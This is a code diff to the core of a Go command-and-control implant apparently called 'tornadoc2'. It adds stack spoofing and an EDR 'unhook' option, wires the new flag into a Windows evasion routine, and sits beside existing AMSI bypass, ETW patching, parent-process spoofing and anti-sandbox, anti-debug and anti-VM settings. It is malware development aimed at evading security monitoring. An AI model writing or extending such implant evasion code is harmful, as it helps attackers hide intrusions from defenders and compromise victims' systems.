@@ -15,6 +15,7 @@ import (
 	"strings"
 	"time"
 	"tornadoc2/agent/evasion"
+	"tornadoc2/agent/internal/spoof"
 	"tornadoc2/agent/platform"
 	"tornadoc2/agent/protocol"
 )
@@ -46,6 +47,8 @@ func Main(cfg Config) {
 	DefaultURL = cfg.DefaultURL
 	DefaultProfile = cfg.DefaultProfile
 	ServerPubKeyPem = cfg.ServerPubKeyPem
+	AgentVersion = cfg.AgentVersion
+	StackSpoof = cfg.StackSpoof
 	ClientCertPem = cfg.ClientCertPem
 	ClientKeyPem = cfg.ClientKeyPem
 	RootCAPem = cfg.RootCAPem
@@ -109,6 +112,7 @@ func Main(cfg Config) {
 	AntiSandboxEnabled = cfg.AntiSandbox
 	SleepMaskEnabled = cfg.SleepMask
 	AmsiBypass = cfg.AmsiBypass
+	Unhook = cfg.Unhook
 	EtwPatch = cfg.EtwPatch
 	StringObfuscation = cfg.StringObfuscation
 	PpidSpoof = cfg.PpidSpoof
@@ -142,6 +146,7 @@ func Main(cfg Config) {
 		AntiSandboxEnabled, SleepMaskType, AmsiBypass,
 		EtwPatch, PpidSpoof, AntiDebug, AntiVm)
 
+	spoof.SetEnabled(StackSpoof)
 	evasion.SetSyscallMethod(SyscallMethod)
 
 	if ObfKeyHex != "" {
@@ -193,10 +198,10 @@ func Main(cfg Config) {
 				os.Exit(0)
 			}
 		}
-		if AmsiBypass || EtwPatch {
+		if AmsiBypass || EtwPatch || Unhook {
 			diag("[core] applying Windows evasion amsi=%v etw=%v\n",
 				AmsiBypass, EtwPatch)
-			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch)
+			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch, Unhook)
 		}
 	}
 
